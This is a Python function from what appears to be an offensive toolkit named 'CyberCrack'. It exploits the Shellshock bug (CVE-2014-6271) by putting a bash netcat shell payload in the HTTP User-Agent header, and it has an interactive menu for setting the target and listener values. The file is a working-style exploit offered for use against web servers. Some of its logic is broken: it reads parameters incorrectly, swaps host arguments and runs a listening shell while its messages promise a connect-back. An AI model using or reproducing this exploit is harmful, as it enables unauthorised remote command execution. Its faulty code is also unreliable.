def shellshock():
    import http.client
    import urllib
    def shock(uri, host, port, remote):
        print("Attempting to exploit CVE-2014-6271 on %s" % (host))
        print("We will attempt to connect back to %s %s" % (remote, port))
        conn = http.client.HTTPConnection(host)
        reverse_shell = "() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l %s %s > /tmp/f'" % (
        remote, port)

        print("We will use the following shell: " + reverse_shell)
        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "User-Agent": reverse_shell}
        conn.request("GET", uri, headers=headers)
        res = conn.getresponse()
        print(res.status, res.reason)
        data = res.read()
        print(data)

    def cmd():
        while True:
            try:
                user_in = input("CyberCrack: Cybercrack/exploits/shellshock > ")
                if user_in == "help" or user_in == "show options":
                    print(r"""
    : set URI               target uri
    : set LHOST             the host to connect back to
    : set LPORT             the port to listen on
    : set T_IP              target ip
                                        """)
                elif user_in.startswith("set"):
                    if user_in.split()[1] == "URI":
                        print("URI = " + str(user_in[2]))
                        URI = user_in[2]
                    elif user_in.split()[1] == "LHOST":
                        LHOST = user_in[2]
                        print("LHOST = " + LHOST)
                    elif user_in.split()[1] == "LPORT":
                        LPORT = user_in.split()[2]
                        print("LPORT = " + str(LPORT))
                    elif user_in.split()[1] == "T_IP":
                        T_IP = user_in.split()[2]
                        print("T_IP = " + str(T_IP))
                    else:
                        print("[+] Invalid parameter for set")
                elif user_in == "run" or user_in == "exploit":
                    shock(uri=URI, host=LHOST, port=LPORT, remote=T_IP)
            except KeyboardInterrupt:
                quit()
            except NameError:
                print("Assign all values related to this exploit")

    cmd()